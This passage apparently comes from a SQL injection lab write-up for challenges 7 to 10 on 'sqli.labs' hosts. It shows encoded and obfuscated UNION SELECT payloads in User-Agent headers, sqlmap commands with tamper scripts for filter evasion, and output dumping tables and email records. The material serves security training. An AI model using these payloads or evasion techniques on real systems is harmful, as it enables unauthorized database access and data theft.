| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

[17:49:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/7.sqli.labs'
[17:49:47] [WARNING] your sqlmap version is outdated
```

```bash
0x716a6b7871) FROM `7sqlilabs`.email LIMIT 19,1)-- -
[17:51:37] [INFO] retrieved: 'cursus@nullaInteger.com','E8892BA7-E840-D5AB-5512-2C9A67123C56','20'
Database: 7sqlilabs                                                                                                                                                                        
Table: email
[20 entries]
+----+--------------------------------------+-----------------------------------------+
| id | guid                                 | email                                   |
+----+--------------------------------------+-----------------------------------------+
| 1  | A92FF4F4-A40F-DE66-FAED-EEF49CD221C3 | sed@euismodenim.edu                     |
| 2  | 5115A2AE-27F8-8A30-50CC-68FB5C9AFD49 | sem.Pellentesque.ut@magnaCras.co.uk     |
| 3  | 683E343F-5EA7-D8F8-533F-778AE4777F6F | ipsum@semmollis.edu                     |
| 4  | C91ED382-43FF-5DA3-0167-09B364735EB0 | nisl@lobortismaurisSuspendisse.edu      |
| 5  | ED0ACC3C-16A7-1AF7-DCCF-C80EA57A93E6 | gravida.Praesent.eu@egetlacusMauris.edu |
| 6  | 1E2B9776-AF14-2065-3BBD-A84958ECCD91 | adipiscing.non@penatibusetmagnis.net    |
| 7  | 9B6F6D2E-8B9C-B352-B964-4410C96040D2 | enim.Sed.nulla@risus.edu                |
| 8  | 5234F2D1-CFB1-E26F-E371-657DB0AD57E5 | elsboss@els.com                         |
| 9  | AC977B0D-D53D-D9DD-0C47-5C571E36C2E4 | nunc@rutrummagna.edu                    |
| 10 | 20301170-DDDE-2BEE-9B80-45D9BC91C889 | fermentum@pellentesqueeget.ca           |
| 11 | AF1E5A35-02ED-7A13-EDB3-33ABAFE1AA22 | molestie@elitNulla.org                  |
| 12 | DB47FB7A-2E3D-A159-E486-D291285230AD | lacus.Quisque@mi.ca                     |
| 13 | 98D20F2E-BC37-A043-041E-D876CA8E2627 | augue.eu@Crasconvallis.co.uk            |
| 14 | 8D121804-4047-4E2A-1EDF-ED2023717533 | tempor.est.ac@consectetuercursuset.net  |
| 15 | EAF2AD04-803B-5787-D93D-859D85FE59CD | interdum.Curabitur@vitae.com            |
| 16 | 7F53E5D9-B40C-05CE-401F-3ECCFBDFDF82 | Cum.sociis@ipsum.co.uk                  |
| 17 | 5D3E410B-3288-6B24-30D2-B464BB123579 | massa.rutrum.magna@hendrerit.org        |
| 18 | 771178FB-5A4D-4A1C-798F-EF646D1A4473 | metus.sit@egestasAliquam.org            |
| 19 | 7EF6514D-1618-8368-B602-BCD92DD820E5 | hack4fun@domain.com                     |
| 20 | E8892BA7-E840-D5AB-5512-2C9A67123C56 | cursus@nullaInteger.com                 |
+----+--------------------------------------+-----------------------------------------+

```

### SQLi 8

```bash
GET / HTTP/1.1
Host: 8.sqli.labs
User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
```

```bash
sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner
        ___
       __H__                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.5.3.22#dev}                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:59:41 /2025-01-02/

[17:59:41] [INFO] loading tamper module 'charencode'
[17:59:41] [INFO] testing connection to the target URL
[17:59:41] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:59:41] [INFO] heuristic (basic) test shows that parameter 'User-Agent' might be injectable (possible DBMS: 'MySQL')
[17:59:41] [INFO] testing for SQL injection on parameter 'User-Agent'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[17:59:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:59:54] [WARNING] reflective value(s) found and filtering out
[17:59:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:59:54] [INFO] target URL appears to have 1 column in query
[17:59:54] [INFO] parameter 'User-Agent' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[17:59:54] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positive
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 23 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: -2005' UNION ALL SELECT CONCAT(0x7171766271,0x57647758534c7242697656486b705169767064754f634348614d6d55474c615a5452554a7257546d,0x7170766271)-- -
---
[17:59:58] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:59:58] [INFO] testing MySQL
[17:59:58] [INFO] confirming MySQL
[17:59:58] [INFO] the back-end DBMS is MySQL
[17:59:58] [INFO] fetching banner
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.0
banner: '5.5.47-0ubuntu0.14.04.1'
[17:59:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/8.sqli.labs'
[17:59:58] [WARNING] your sqlmap version is outdated

```
```bash
Database: 8sqlilabs                                                                                                                                                                        
[1 table]
+---------------------------------------+
| browsers                              |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+


```


### SQLi 9

```bash
GET / HTTP/1.1
Host: 9.sqli.labs
User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
```

```bash
sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner --dbms=Mysql
        ___
       __H__                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.5.3.22#dev}                                                                                                                                                    
|_ -| . [']     | .'| . |                                                                                                                                                                   
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:02:53 /2025-01-02/

[18:02:53] [INFO] loading tamper module 'chardoubleencode'
[18:02:53] [INFO] testing connection to the target URL
[18:02:53] [INFO] heuristic (basic) test shows that parameter 'User-Agent' might be injectable (possible DBMS: 'MySQL')
[18:02:53] [INFO] testing for SQL injection on parameter 'User-Agent'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[18:03:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:03:01] [INFO] target URL appears to be UNION injectable with 1 columns
[18:03:01] [WARNING] reflective value(s) found and filtering out
[18:03:01] [INFO] parameter 'User-Agent' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[18:03:01] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positive
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: -9769' UNION ALL SELECT CONCAT(0x7178766a71,0x52614a42536f49644d564d4e434273575977484b645a735768504d4a695942474e456c67796a6d4a,0x71706a6b71)-- -
---
[18:03:07] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:03:07] [INFO] testing MySQL
[18:03:07] [INFO] confirming MySQL
[18:03:07] [INFO] the back-end DBMS is MySQL
[18:03:07] [INFO] fetching banner
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.0
banner: '5.5.47-0ubuntu0.14.04.1'
[18:03:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/9.sqli.labs'
[18:03:07] [WARNING] your sqlmap version is outdated
```

```bash
[18:03:40] [INFO] retrieved: '9sqlilabs','browsers'
Database: 9sqlilabs                                                                                                                                                                        
[2 tables]
+---------------------------------------+
| accounts                              |
| browsers                              |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+


```




### SQLi 10


```bash
GET / HTTP/1.1
Host: 10.sqli.labs
User-Agent: ') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -
```

```bash
sqlmap -u 'http://10.sqli.labs/' -p user-agent --tamper=/usr/share/sqlmap/tamper/fill.py  --dbms=Mysql --level=3 --risk=3 --tables


.....


[18:09:22] [INFO] retrieved: '10sqlilabs','browsers'
Database: 10sqlilabs                                                                                                                                                                       
[1 table]
+---------------------------------------+
| browsers                              |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+



```





[back](./)

